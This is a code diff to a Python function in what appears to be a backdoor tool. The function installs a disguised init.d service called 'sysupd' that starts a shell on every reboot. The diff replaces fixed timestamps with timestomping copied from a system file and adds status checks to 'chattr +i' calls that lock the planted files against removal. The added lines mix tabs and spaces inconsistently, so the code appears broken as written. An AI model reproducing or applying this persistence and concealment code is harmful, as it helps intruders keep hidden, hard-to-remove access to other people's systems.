@@ -20,20 +20,25 @@ def persistent():
 	else:
 		if os.path.isdir("/etc/init.d"):
 			serwrite = open("/etc/init.d/sysupd", "w")
-			serwrite.write("#!/bin/sh\ncd /etc/default/\nsudo python sysupd --%s &" % shell)
+			serwrite.write("#!/bin/sh\ncd /etc/default/\npython sysupd --%s &" % shell)
 			serwrite.close()
 			os.system("chmod +x /etc/init.d/sysupd")
 			os.system("update-rc.d sysupd defaults")
 			print("[+] Persistent service installed.")
-			print("[+] Modifying touch times on shell files...")
-			os.system("touch -t 200512311216 /etc/default/sysupd")
-			os.system("touch -t 200512311216 /etc/init.d/sysupd")
+			print("[+] Modifying accessed and modified times on shell files...")
+            copystat = os.stat('/etc/init.d/rcS')
+			os.utime("/etc/default/sysupd",(copystat.st_atime, copystat.st_mtime))
+			os.utime("/etc/init.d/sysupd",(copystat.st_atime, copystat.st_mtime))
 			print("[+] Attempting to lock down shell files...")
 			if whereis('chattr') is not None:
-				os.system("chattr +i /etc/default/sysupd")
-				os.system("chattr +i /etc/init.d/sysupd")
+				status = os.system("chattr +i /etc/default/sysupd")
+                if status & 0xff00:
+                    print("[!] Chattr exited with non-zero status. Could not lock files.")
+				status = os.system("chattr +i /etc/init.d/sysupd")
+                if status & 0xff00:
+                    print("[!] Chattr exited with non-zero status. Could not lock files.")
 			else:
-				print("[!] Chattr not found. Could not lock files.")
+                print("[!] Chattr not found. Could not lock files.")
 
 			print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")
 
